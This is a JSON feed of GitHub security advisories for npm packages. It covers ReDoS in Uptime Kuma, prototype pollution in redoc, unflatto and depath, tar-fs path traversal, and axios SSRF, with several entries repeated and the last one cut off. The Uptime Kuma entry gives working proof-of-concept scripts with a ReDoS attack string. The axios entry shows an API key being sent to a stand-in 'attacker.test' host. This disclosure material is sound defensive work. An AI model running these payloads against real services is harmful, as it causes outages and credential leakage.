{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a <code>ReDoS vulnerability risk</code> in the system, specifically when administrators create <code>notification</code> through the web service(<code>pushdeer</code> and <code>whapi</code>). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The regular expression<code> \\/*$\\</code> is used to match zero or more slashes <code>/</code> at the end of a URL. When a malicious attack string appends a large number of slashes <code>/</code> and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.</p>\n<pre><code class=\"language-js\">.replace(/\\/*$/, \"\")\n</code></pre>\n<p>For the regular expression <code>/\\/*$/</code>, an attack string like </p>\n<pre><code class=\"language-javascript\">\"https://e\" + \"/\".repeat(100000) + \"@\" \n</code></pre>\n<p>can trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.</p>\n<blockquote>\n<p>When entered from the web interface, the attack string needs to expand <code>\"/\".repeat(100000)</code> and be input directly, such as <code>https://e/////////..//@</code>. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.</p>\n</blockquote>\n<h3 id=\"poc\">PoC</h3>\n<p>The poc.js is in: \n<a href=\"https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0\">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a>\nThe time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:</p>\n<pre><code class=\"language-javascript\">const semver = require(\"semver\");\nlet test;\nconst nodeVersion = process.versions.node;\nif (semver.satisfies(nodeVersion, \"&gt;= 18\")) {\n    test = require(\"node:test\");\n} else {\n    test = require(\"test\");\n}\nconst PushDeer = require(\"../../server/notification-providers/pushdeer.js\");\n\nconst assert = require(\"node:assert\");\n\ntest(\"Test ReDos - attack string\", async (t) =&gt; {\n    const pushDeer = new PushDeer();\n    const notification = {\n        pushdeerServer: \"https://e\" + \"/\".repeat(100000) + \"@\",\n    };\n    const msg = \"Test Attacking\";\n    const startTime = performance.now();\n    try {\n        pushDeer.send(notification, msg)\n    } catch (error) {\n    // pass\n    }\n    const endTime = performance.now();\n    const elapsedTime = endTime - startTime;\n    const reDosThreshold = 2000;\n    assert(elapsedTime &lt;= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);\n});\n</code></pre>\n<blockquote>\n<p>Move the <code>test-uptime-calculator.js</code> file to the <code>./uptime-kuma/test/backend-test</code> folder and run <code>npm run test-backend</code> to execute the backend tests.</p>\n</blockquote>\n<p>Trigger conditions for whapi jams, In the send function within the <code>uptime-kuma\\server\\notification-providers\\pushdeer.js</code> file:\n<a href=\"https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28\">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></p>\n<pre><code class=\"language-js\">// The attack string \"httpS://example\" + \"/\".repeat(100000) + \"@\"\n// poc.js\n// Import the target file\nconst Whapi = require(\"./uptime-kuma/server/notification-providers/whapi\");\n\n// Create an instance of Whapi\nconst whapi = new Whapi();\n\nconst notification = {\n    whapiApiUrl: \"https://e\" + \"/\".repeat(100000) + \"@\",\n};\n// console.log(`${notification.whapiApiUrl}`);\n// Define the message to be sent\nconst msg = \"Test Attacking\";\n\n// Call the send method and handle exceptions\nwhapi.send(notification, msg)\n\n// 1-5 are the original installation methods for the project\n// 6-8 are attack methods\n// ---\n// 1.run `git clone https://github.com/louislam/uptime-kuma.git`\n// 2.run `cd uptime-kuma`\n// 3.run `npm run setup`\n// 4.run `npm install pm2 -g &amp;&amp; pm2 install pm2-logrotate`\n// 5.run `pm2 start server/server.js --name uptime-kuma`\n// ---\n// 6.Run npm install in the root directory of the same level as `README.md`\n// 7.Move `poc.js` to the root directory of the same level as `README.md`\n// 8.and then run `node poc.js`\n</code></pre>\n<p>After running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.\n<img src=\"https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812\" alt=\"redos\" width=\"760\"></p>\n<p>You can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of <code>/</code> to the URL, followed by a <code>non-/</code> character at the end, entered directly.</p>\n<img src=\"https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408\" alt=\"1\" width=\"1280\">\n<img src=\"https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669\" alt=\"webserver\" width=\"1280\">\n\n<h3 id=\"impact\">Impact</h3>\n<p><strong>What kind of vulnerability is it?</strong></p>\n<p>This is a <code>Regular Expression Denial of Service (ReDoS)</code> vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in <code>significant performance degradation or complete service unavailability</code>, especially when processing specially crafted attack strings.</p>\n<p><strong>Who is impacted?</strong></p>\n<ol>\n<li><p><strong>Uptime Kuma users</strong>:\nAny users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like <code>pushdeer.js</code> and <code>whapi.js</code>. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.</p>\n</li>\n<li><p><strong>Web services and hosting providers</strong>:\nIf Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to <code>downtime</code>, <code>degraded performance</code>, or <code>resource exhaustion</code>.</p>\n</li>\n</ol>\n<h3 id=\"solution\">Solution</h3>\n<p>@louislam I have provided a solution for you to check:<a href=\"https://github.com/louislam/uptime-kuma/pull/5573\">https://github.com/louislam/uptime-kuma/pull/5573</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg\">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/pull/5573\">https://github.com/louislam/uptime-kuma/pull/5573</a></li>\n<li><a href=\"https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0\">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a></li>\n<li><a href=\"https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28\">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hx7h-9vf7-5xhg\">https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hx7h-9vf7-5xhg",
            "title": "[uptime-kuma] Uptime Kuma's Regular Expression in pushdeeer and whapi file Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-03-31T16:12:54.000Z",
            "date_published": "2025-03-31T16:12:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hx7h-9vf7-5xhg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a <code>ReDoS vulnerability risk</code> in the system, specifically when administrators create <code>notification</code> through the web service(<code>pushdeer</code> and <code>whapi</code>). If a string is provided that triggers catastrophic backtracking in the regular expression, it may lead to a ReDoS attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The regular expression<code> \\/*$\\</code> is used to match zero or more slashes <code>/</code> at the end of a URL. When a malicious attack string appends a large number of slashes <code>/</code> and a non-slash character at the end of the URL, the regular expression enters a backtracking matching process. During this process, the regular expression engine starts checking each slash from the first one, continuing until it encounters the last non-slash character. Due to the greedy matching nature of the regular expression, this process repeats itself, with each backtrack checking the next slash until the last slash is checked. This backtracking process consumes significant CPU resources.</p>\n<pre><code class=\"language-js\">.replace(/\\/*$/, \"\")\n</code></pre>\n<p>For the regular expression <code>/\\/*$/</code>, an attack string like </p>\n<pre><code class=\"language-javascript\">\"https://e\" + \"/\".repeat(100000) + \"@\" \n</code></pre>\n<p>can trigger catastrophic backtracking, causing the web service to freeze and potentially leading to a ReDoS attack.</p>\n<blockquote>\n<p>When entered from the web interface, the attack string needs to expand <code>\"/\".repeat(100000)</code> and be input directly, such as <code>https://e/////////..//@</code>. This triggers catastrophic backtracking, leading to web service lag and posing a potential ReDoS attack risk.</p>\n</blockquote>\n<h3 id=\"poc\">PoC</h3>\n<p>The poc.js is in: \n<a href=\"https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0\">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a>\nThe time lag phenomenon can be observed through test-pushdeer-ReDos, which helps verify the presence of the ReDoS attack:</p>\n<pre><code class=\"language-javascript\">const semver = require(\"semver\");\nlet test;\nconst nodeVersion = process.versions.node;\nif (semver.satisfies(nodeVersion, \"&gt;= 18\")) {\n    test = require(\"node:test\");\n} else {\n    test = require(\"test\");\n}\nconst PushDeer = require(\"../../server/notification-providers/pushdeer.js\");\n\nconst assert = require(\"node:assert\");\n\ntest(\"Test ReDos - attack string\", async (t) =&gt; {\n    const pushDeer = new PushDeer();\n    const notification = {\n        pushdeerServer: \"https://e\" + \"/\".repeat(100000) + \"@\",\n    };\n    const msg = \"Test Attacking\";\n    const startTime = performance.now();\n    try {\n        pushDeer.send(notification, msg)\n    } catch (error) {\n    // pass\n    }\n    const endTime = performance.now();\n    const elapsedTime = endTime - startTime;\n    const reDosThreshold = 2000;\n    assert(elapsedTime &lt;= reDosThreshold, `🚨 Potential ReDoS Attack! send method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);\n});\n</code></pre>\n<blockquote>\n<p>Move the <code>test-uptime-calculator.js</code> file to the <code>./uptime-kuma/test/backend-test</code> folder and run <code>npm run test-backend</code> to execute the backend tests.</p>\n</blockquote>\n<p>Trigger conditions for whapi jams, In the send function within the <code>uptime-kuma\\server\\notification-providers\\pushdeer.js</code> file:\n<a href=\"https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28\">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></p>\n<pre><code class=\"language-js\">// The attack string \"httpS://example\" + \"/\".repeat(100000) + \"@\"\n// poc.js\n// Import the target file\nconst Whapi = require(\"./uptime-kuma/server/notification-providers/whapi\");\n\n// Create an instance of Whapi\nconst whapi = new Whapi();\n\nconst notification = {\n    whapiApiUrl: \"https://e\" + \"/\".repeat(100000) + \"@\",\n};\n// console.log(`${notification.whapiApiUrl}`);\n// Define the message to be sent\nconst msg = \"Test Attacking\";\n\n// Call the send method and handle exceptions\nwhapi.send(notification, msg)\n\n// 1-5 are the original installation methods for the project\n// 6-8 are attack methods\n// ---\n// 1.run `git clone https://github.com/louislam/uptime-kuma.git`\n// 2.run `cd uptime-kuma`\n// 3.run `npm run setup`\n// 4.run `npm install pm2 -g &amp;&amp; pm2 install pm2-logrotate`\n// 5.run `pm2 start server/server.js --name uptime-kuma`\n// ---\n// 6.Run npm install in the root directory of the same level as `README.md`\n// 7.Move `poc.js` to the root directory of the same level as `README.md`\n// 8.and then run `node poc.js`\n</code></pre>\n<p>After running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.\n<img src=\"https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812\" alt=\"redos\" width=\"760\"></p>\n<p>You can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of <code>/</code> to the URL, followed by a <code>non-/</code> character at the end, entered directly.</p>\n<img src=\"https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408\" alt=\"1\" width=\"1280\">\n<img src=\"https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669\" alt=\"webserver\" width=\"1280\">\n\n<h3 id=\"impact\">Impact</h3>\n<p><strong>What kind of vulnerability is it?</strong></p>\n<p>This is a <code>Regular Expression Denial of Service (ReDoS)</code> vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in <code>significant performance degradation or complete service unavailability</code>, especially when processing specially crafted attack strings.</p>\n<p><strong>Who is impacted?</strong></p>\n<ol>\n<li><p><strong>Uptime Kuma users</strong>:\nAny users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like <code>pushdeer.js</code> and <code>whapi.js</code>. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.</p>\n</li>\n<li><p><strong>Web services and hosting providers</strong>:\nIf Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to <code>downtime</code>, <code>degraded performance</code>, or <code>resource exhaustion</code>.</p>\n</li>\n</ol>\n<h3 id=\"solution\">Solution</h3>\n<p>@louislam I have provided a solution for you to check:<a href=\"https://github.com/louislam/uptime-kuma/pull/5573\">https://github.com/louislam/uptime-kuma/pull/5573</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg\">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/pull/5573\">https://github.com/louislam/uptime-kuma/pull/5573</a></li>\n<li><a href=\"https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0\">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a></li>\n<li><a href=\"https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28\">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hx7h-9vf7-5xhg\">https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hx7h-9vf7-5xhg",
            "title": "[uptime-kuma] Uptime Kuma's Regular Expression in pushdeeer and whapi file Leads to ReDoS Vulnerability Due to Catastrophic Backtracking",
            "date_modified": "2025-03-31T16:12:54.000Z",
            "date_published": "2025-03-31T16:12:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hx7h-9vf7-5xhg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A prototype pollution in the component Module.mergeObjects (redoc/bundles/redoc.lib.js:2) of redoc &lt;= 2.2.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57083\">https://nvd.nist.gov/vuln/detail/CVE-2024-57083</a></li>\n<li><a href=\"https://github.com/Redocly/redoc/issues/2499\">https://github.com/Redocly/redoc/issues/2499</a></li>\n<li><a href=\"https://github.com/Redocly/redoc/pull/2638\">https://github.com/Redocly/redoc/pull/2638</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9rhg-254w-fh9x\">https://github.com/advisories/GHSA-9rhg-254w-fh9x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9rhg-254w-fh9x",
            "title": "[redoc] Redoc Prototype Pollution via `Module.mergeObjects` Component",
            "date_modified": "2025-03-31T15:58:52.000Z",
            "date_published": "2025-03-28T21:30:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9rhg-254w-fh9x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>alizeait unflatto &lt;= 1.0.2 was discovered to contain a prototype pollution via the method exports.unflatto at /dist/index.js. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38988\">https://nvd.nist.gov/vuln/detail/CVE-2024-38988</a></li>\n<li><a href=\"https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713\">https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713</a></li>\n<li><a href=\"https://github.com/alizeait/unflatto/issues/32\">https://github.com/alizeait/unflatto/issues/32</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-799q-f2px-wx8c\">https://github.com/advisories/GHSA-799q-f2px-wx8c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-799q-f2px-wx8c",
            "title": "[@alizeait/unflatto] @alizeait/unflatto Prototype Pollution via `exports.unflatto` Method",
            "date_modified": "2025-03-31T15:57:17.000Z",
            "date_published": "2025-03-28T21:30:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-799q-f2px-wx8c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>janryWang products depath v1.0.6 and cool-path v1.1.2 were discovered to contain a prototype pollution via the set() method at setIn (lib/index.js:90). This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38985\">https://nvd.nist.gov/vuln/detail/CVE-2024-38985</a></li>\n<li><a href=\"https://github.com/janryWang/depath/issues/11\">https://github.com/janryWang/depath/issues/11</a></li>\n<li><a href=\"https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d\">https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4h4x-4m75-47j4\">https://github.com/advisories/GHSA-4h4x-4m75-47j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4h4x-4m75-47j4",
            "title": "[cool-path] depath and cool-path vulnerable to Prototype Pollution via `set()` Method",
            "date_modified": "2025-03-31T15:56:48.000Z",
            "date_published": "2025-03-28T21:30:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4h4x-4m75-47j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>janryWang products depath v1.0.6 and cool-path v1.1.2 were discovered to contain a prototype pollution via the set() method at setIn (lib/index.js:90). This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38985\">https://nvd.nist.gov/vuln/detail/CVE-2024-38985</a></li>\n<li><a href=\"https://github.com/janryWang/depath/issues/11\">https://github.com/janryWang/depath/issues/11</a></li>\n<li><a href=\"https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d\">https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4h4x-4m75-47j4\">https://github.com/advisories/GHSA-4h4x-4m75-47j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4h4x-4m75-47j4",
            "title": "[depath] depath and cool-path vulnerable to Prototype Pollution via `set()` Method",
            "date_modified": "2025-03-31T15:56:48.000Z",
            "date_published": "2025-03-28T21:30:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4h4x-4m75-47j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An Improper Link Resolution Before File Access (\"Link Following\") and Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>\n<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-12905\">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>\n<li><a href=\"https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed\">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pq67-2wwv-3xjx\">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pq67-2wwv-3xjx",
            "title": "[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File",
            "date_modified": "2025-03-28T22:11:43.000Z",
            "date_published": "2025-03-27T18:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pq67-2wwv-3xjx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An Improper Link Resolution Before File Access (\"Link Following\") and Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>\n<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-12905\">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>\n<li><a href=\"https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed\">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pq67-2wwv-3xjx\">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pq67-2wwv-3xjx",
            "title": "[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File",
            "date_modified": "2025-03-28T22:11:43.000Z",
            "date_published": "2025-03-27T18:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pq67-2wwv-3xjx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An Improper Link Resolution Before File Access (\"Link Following\") and Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>\n<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-12905\">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>\n<li><a href=\"https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed\">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pq67-2wwv-3xjx\">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pq67-2wwv-3xjx",
            "title": "[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File",
            "date_modified": "2025-03-28T22:11:43.000Z",
            "date_published": "2025-03-27T18:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pq67-2wwv-3xjx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463</p>\n<p>A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠<code>baseURL</code> is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.</p>\n<h3 id=\"details\">Details</h3>\n<p>Consider the following code snippet:</p>\n<pre><code class=\"language-js\">import axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n</code></pre>\n<p>In this example, the request is sent to <code>http://attacker.test/</code> instead of the <code>baseURL</code>. As a result, the domain owner of <code>attacker.test</code> would receive the <code>X-API-KEY</code> included in the request headers.</p>\n<p>It is recommended that:</p>\n<ul>\n<li>   When <code>baseURL</code> is set, passing an absolute URL such as <code>http://attacker.test/</code> to <code>get()</code> should not ignore <code>baseURL</code>.</li>\n<li>   Before sending the HTTP request (after combining the <code>baseURL</code> with the user-provided parameter), axios should verify that the resulting URL still begins with the expected <code>baseURL</code>.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>Follow the steps below to reproduce the issue:</p>\n<ol>\n<li>   Set up two simple HTTP servers:</li>\n</ol>\n<pre><code>mkdir /tmp/server1 /tmp/server2\necho \"this is server1\" &gt; /tmp/server1/index.html \necho \"this is server2\" &gt; /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &amp;\npython -m http.server -d /tmp/server2 10002 &amp;\n</code></pre>\n<ol start=\"2\">\n<li>   Create a script (e.g., main.js):</li>\n</ol>\n<pre><code class=\"language-js\">import axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n</code></pre>\n<ol start=\"3\">\n<li>   Run the script:</li>\n</ol>\n<pre><code>$ node main.js\nthis is server2\n</code></pre>\n<p>Even though <code>baseURL</code> is set to <code>http://localhost:10001/</code>, axios sends the request to <code>http://localhost:10002/</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>   Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.</li>\n<li>   SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.</li>\n<li>   Affected Users: Software that uses <code>baseURL</code> and does not validate path parameters is affected by this issue.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6\">https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</a></li>\n<li><a href=\"https://github.com/axios/axios/issues/6463\">https://github.com/axios/axios/issues/6463</a></li>\n<li><a href=\"https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f\">https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</a></li>\n<li><a href=\"https://github.com/axios/axios/releases/tag/v1.8.2\">https://github.com/axios/axios/releases/tag/v1.8.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27152\">https://nvd.nist.gov/vuln/detail/CVE-2025-27152</a></li>\n<li><a href=\"https://github.com/axios/axios/pull/6829\">https://github.com/axios/axios/pull/6829</a></li>\n<li><a href=\"https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde\">https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jr5f-v2jv-69x6\">https://github.com/advisories/GHSA-jr5f-v2jv-69x6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6",
            "title": "[axios] axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
            "date_modified": "2025-03-28T14:57:53.000Z",
            "date_published": "2025-03-07T15:16:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jr5f-v2jv-69x6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).\nReference: axios/axios#6463</p>\n<p>A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠<code>baseURL</code> is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.</p>\n<h3 id=\"details\">Details</h3>\n<p>Consider the following code snippet:</p>\n<pre><code class=\"language-js\">import axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n</code></pre>\n<p>In this example, the request is sent to <code>http://attacker.test/</code> instead of the <code>baseURL</code>. As a result, the domain owner of 